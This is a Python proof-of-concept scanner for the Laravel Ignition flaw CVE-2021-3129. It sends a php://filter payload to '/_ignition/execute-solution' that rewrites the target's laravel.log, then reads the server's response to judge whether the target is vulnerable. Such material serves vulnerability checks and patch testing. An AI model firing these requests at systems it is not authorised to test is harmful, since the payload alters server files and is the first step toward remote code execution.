#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/14 16:00
# Author     : yunkong
# FileName   : cve_2021_3129_poc.py
# Description:
#
# Exploit Title: Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）
# Version: Laravel <= 8.4.2
# CVE: CVE-2021-3129
import requests

data_clear_log = '''
{
  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
'''

data_poc = '''
{
  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "AA"
  }
}
'''

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Content-Type": "application/json"
}


def check_cve_2021_3129(target_url):
    try:
        res1 = requests.post(url=target_url + "/_ignition/execute-solution",
                             headers=header,
                             data=data_clear_log,
                             timeout=10
                             )
        if res1.status_code != 200:
            print(f"[-] Target: {target_url} CVE-2021-3129 may not exist.")
            return False
        res2 = requests.post(url=target_url + "/_ignition/execute-solution",
                             headers=header,
                             data=data_poc,
                             timeout=10
                             )
        if res2.status_code != 500:
            print(f"[-] Target: {target_url} CVE-2021-3129 may not exist.")
            return False
        else:
            print(f"[+] Target: {target_url} CVE-2021-3129 may exist!")
            return True
    except:
        print(f"[-] Unable to connect to the target host.")
        return False


def vuln_scan_start(target_url):
    check_cve_2021_3129(target_url)


# vuln_scan_start("http://192.168.12.12:880")
